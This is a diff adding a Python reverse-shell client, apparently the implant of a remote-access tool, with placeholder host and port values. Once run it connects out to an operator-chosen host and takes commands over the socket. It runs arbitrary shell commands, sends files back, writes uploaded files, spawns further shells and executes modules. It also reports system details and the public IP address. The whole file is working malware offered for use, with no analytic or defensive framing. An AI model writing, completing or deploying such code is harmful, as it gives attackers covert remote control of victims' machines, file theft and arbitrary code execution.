@@ -1,0 +1,208 @@
+#!/usr/bin/python3
+
+
+# Author : Kavishka Gihan
+# Instagram : @_kavi.gihan
+# Email : iamkavigihan@gmail.com
+
+import socket,shutil
+import subprocess,platform
+import os,sys,time
+import threading
+
+# Don't change  these two lines !!!
+host = "$$IP$$"
+port = "$$PORT$$"
+# Don't change  these two lines !!!
+
+
+s = socket.socket()
+
+s.connect((str(host), int(port)))
+s.send(bytes('ASDF', "UTF-8"))
+
+
+def get_size(bytes, suffix="B"):
+    factor = 1024
+    for unit in ["", "K", "M", "G", "T", "P"]:
+        if bytes < factor:
+            return f"{bytes:.2f}{unit}{suffix}"
+        bytes /= factor
+
+
+def memo(s):
+
+	info = ('\n[=] Memory Info\n\n')
+	total, used, free = shutil.disk_usage("/")
+	info += ("    [+] Total: %d GiB\n" % (total // (2**30)))
+	info += ("    [+] Used: %d GiB\n" % (used // (2**30)))
+	info += ("    [+] Free: %d GiB\n" % (free // (2**30)))
+	s.send(bytes(info , 'UTF-8'))
+	time.sleep(0.2)
+
+def info(s):
+	uname = platform.uname()
+	info = ("\n[=] System Info\n\n")
+	info +=  (f"    [+] OS: {uname.system}\n")
+	info += (f"    [+] OS Version: {uname.version}\n")
+	info += (f"    [+] OS Release: {uname.release}\n")
+	info += (f"    [+] Host Name: {uname.node}\n")
+	info += (f"    [+] Architecture: {uname.machine}\n")
+	info += (f"    [+] Processor: {uname.processor}\n")
+	s.send(bytes(info , 'UTF-8'))
+	time.sleep(0.2)
+
+
+def ip_info(connection):
+	global host
+	try:
+		ip = subprocess.run('curl ifconfig.me',shell=True,capture_output=True,text=True)
+		ip_msg = '\n[+] Private IP : ' + host + '\n'
+		ip_msg += '[+] Public IP : ' + ip.stdout + '\n'
+		connection.send(bytes(ip_msg,'UTF-8'))
+
+	except:
+		pass
+
+
+
+while True:
+	try:
+		rec = s.recv(102400).decode()
+		if rec[:2] == "cd" and len(rec) > 3:
+			try:
+				os.chdir(rec[3:])
+				s.send(bytes(str(os.getcwd()) + "EOF", "UTF-8"))
+			except:
+				s.send(bytes("Wrong path was specified", "UTF-8"))
+		elif (rec[:2] == "rm") or (rec[:2] == "mk" ) or (rec[:4] == "mkdir") or (rec[:2] == "rmdir") or (rec[:2]  == "mv"):
+			try:
+				new2 = subprocess.run(str(rec), shell=True, capture_output=True, text=True)
+				if new2.returncode == 0:
+					s.send(bytes(str("Done"), "UTF-8"))
+				else:
+					s.send(bytes(str(new2.stderr) + "EOF", "UTF-8"))
+			except:
+				s.send(bytes("Syntax error", "UTF-8"))
+		elif str(rec) == ("asdf"*10):
+			 s.send(bytes(("asdf"*10), "UTF-8"))
+
+		elif rec == 'cd':
+			s.send(bytes(str(os.getcwd() + 'EOF'), "UTF-8"))
+
+		elif rec == 'get_os':
+			s.send(bytes(platform.uname().system + "EOF",'UTF-8'))
+
+
+		elif rec[:10] == 'check_file':
+			try:
+				file = s.recv(2048).decode()
+				file_exists = os.path.isfile(file.strip())
+				s.send(bytes(str(file_exists) + "EOF", 'UTF-8'))
+
+			except Exception as e:
+				pass
+
+
+		elif rec == 'get_files':
+			time.sleep(1.5)
+			file_path = s.recv(1024).decode()
+			try:
+			
+				if os.path.isfile(file_path):
+					OS = platform.uname().system
+
+					if OS == 'Linux':
+						r = 'cat'
+
+					elif OS == 'Windows':
+						r = 'type'
+					
+					lines = subprocess.run(f'{r} {file_path.strip()}',text=True,capture_output=True,shell=True)
+
+					s.send(bytes(lines.stdout,'UTF-8'))
+					s.send(bytes('EOF', 'UTF-8'))
+
+				else:
+					s.send(b'Failed')
+
+
+			except Exception as e:
+				s.send(bytes(f'[!] ERROR: {e}\n'))
+
+
+		elif rec[:13] == "create_shell":
+			try:
+				shell = s.recv(1000000).decode()
+				uname = platform.uname()
+
+				if uname.system == 'Windows':
+					shell = shell.split("&&")[1].strip()
+				else:
+					shell = shell.split("&&")[0].strip()
+
+				subprocess.Popen(str(shell), shell=True,text=True)
+
+			except:
+				pass
+
+		elif rec == 'send_files':
+
+			try:
+				dst_path = s.recv(1024).decode()
+				lines = b''
+
+				while lines[-3:] != b"EOF":
+					lines += s.recv(90240000)
+
+				with open(dst_path,'wb') as f:
+					f.write(lines[:-3])
+				s.send(b'[+] File uploaded successfully\n')
+
+			except Exception as e:
+				s.send(bytes(f'[!] ERROR: {e}\n', "UTF-8"))
+
+
+		elif rec == 'module_run':
+			try:
+				method = s.recv(10000000).decode()
+
+				subprocess.Popen(str(method), text=True, shell=True)
+
+			except Exception as e:
+				s.send(bytes(e,'UTF-8'))
+
+		elif rec == 'check_os':
+			try:
+				os = platform.uname().system
+				s.send(bytes(os, "UTF-8"))
+
+			except Exception as e:
+				pass
+
+		elif rec == 'sys_info':
+			info(s)
+
+		elif rec == 'sys_info_memo':
+			memo(s)
+
+		elif rec == 'sys_info_all':
+			info(s)
+			memo(s)
+
+		elif rec == 'ip_info':
+			ip_info(s)
+
+		elif rec == "exit":
+			s.close()
+			exit()
+		else:
+			new = subprocess.run(str(rec), shell=True, capture_output=True, text=True)
+			if new.returncode == 0:
+				s.send(bytes(str(new.stdout) + 'EOF', "UTF-8"))
+
+			else:
+				s.send(bytes(str(new.stderr) + 'EOF', "UTF-8"))
+	except Exception as e:
+		pass
+
